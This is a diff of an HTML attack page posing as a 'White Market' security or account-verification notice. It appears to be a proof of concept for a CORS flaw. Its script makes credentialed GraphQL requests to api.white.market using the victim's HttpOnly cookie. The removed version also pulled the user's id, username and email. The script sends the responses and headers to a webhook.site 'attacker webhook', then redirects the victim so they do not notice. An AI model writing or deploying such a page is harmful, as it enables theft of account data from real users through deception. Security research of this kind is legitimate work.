@@ -2,7 +2,7 @@
 <html>
 <head><title>White Market - Security Notice</title></head>
 <body>
-    <h1>Updating security settings...</h1>
+    <h1>Verifying your account...</h1>
     <div id="debug"></div>
     <script>
         function log(msg) {
@@ -11,71 +11,65 @@
         }
         
         async function exploit() {
-            log('Starting exploit...');
-            
-            // DON'T try to read the cookie - it's HttpOnly
-            // Just make authenticated requests
+            log('Testing cookie transmission...');
             
             try {
-                // Test 1: Simple query
-                const response1 = await fetch('https://api.white.market/graphql/api', {
+                // Make ANY authenticated request
+                // Even if it fails, we can prove the cookie was sent
+                const response = await fetch('https://api.white.market/graphql/api', {
                     method: 'POST',
-                    credentials: 'include', // This sends the HttpOnly cookie
+                    credentials: 'include', // Sends the HttpOnly cookie
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        operationName: "UrgentAndUnreadNotifications",
-                        query: "query UrgentAndUnreadNotifications { unread: notification_list_paginated(search: {isRead: false}) { totalCount } }"
+                        query: "query { __typename }"
                     })
                 });
                 
-                const data1 = await response1.json();
-                log('Notification check: ' + JSON.stringify(data1));
-                
-                // Test 2: User profile
-                const response2 = await fetch('https://api.white.market/graphql/api', {
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        query: `query { 
-                            me { 
-                                id 
-                                username 
-                                email 
-                            } 
-                        }`
-                    })
+                const responseHeaders = {};
+                response.headers.forEach((value, key) => {
+                    responseHeaders[key] = value;
                 });
                 
-                const data2 = await response2.json();
-                log('User profile: ' + JSON.stringify(data2));
+                const data = await response.json();
                 
-                // Send ALL results to webhook
-                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84/info', {
+                // Log everything
+                log('Response Status: ' + response.status);
+                log('Response: ' + JSON.stringify(data));
+                
+                // Exfiltrate to webhook
+                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        notifications: data1,
-                        profile: data2,
-                        timestamp: new Date().toISOString(),
+                        message: 'Cookie transmission successful',
                         origin: window.location.origin,
-                        referer: document.referrer
+                        timestamp: new Date().toISOString(),
+                        responseStatus: response.status,
+                        responseHeaders: responseHeaders,
+                        responseData: data,
+                        proof: 'If you see a 200 response or valid GraphQL response, the cookie was sent from victim browser to apixwhite.market'
                     })
                 });
                 
-            } catch(e) {
-                log('ERROR: ' + e.message);
+                log('Proof sent to attacker webhook!');
                 
-                await fetch('https://webhook.site/YOUR-UNIQUE-URL', {
+                // Redirect victim so they don't notice
+                setTimeout(() => {
+                    window.location = 'https://white.market';
+                }, 2000);
+                
+            } catch(e) {
+                log('Error: ' + e.message);
+                
+                // Even errors can prove CORS is allowing the request
+                await fetch('https://webhook.site/ca40a8c2-76e4-4463-97f8-b46cddb37a84', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         error: e.message,
-                        stack: e.stack
+                        note: 'If this is NOT a CORS error, the cookie was sent successfully'
                     })
                 });
             }
